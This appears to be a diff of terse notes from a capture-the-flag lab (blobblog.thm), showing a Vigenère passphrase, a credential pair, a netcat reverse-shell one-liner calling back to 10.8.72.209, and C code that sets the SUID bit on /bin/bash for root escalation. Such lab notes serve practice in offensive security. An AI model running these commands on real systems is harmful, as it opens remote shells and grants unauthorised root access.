@@ -102,12 +102,20 @@ http://blobblog.thm:8080/review
 we vigenère cipher with zcv and can decrypt it with passphrase youmayenter
 bob:d1ff3r3ntP@55w0rd
 
+
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f
 
+we call blogFeedback as 
+/usr/bin/blogFeedback 6 5 4 3 2 1
 
-#include <sys/stat.h>
+we privesc to blolobaw
+
+
+#include <stdlib.h>
 
 int main(void) {
-  chmod("/bin/bash", 04777);
+  system("chmod u+s /bin/bash");
   return 0;
 }
+
+with that code, we can abuse the process that gcc a file owned by user and compiled and executed by root
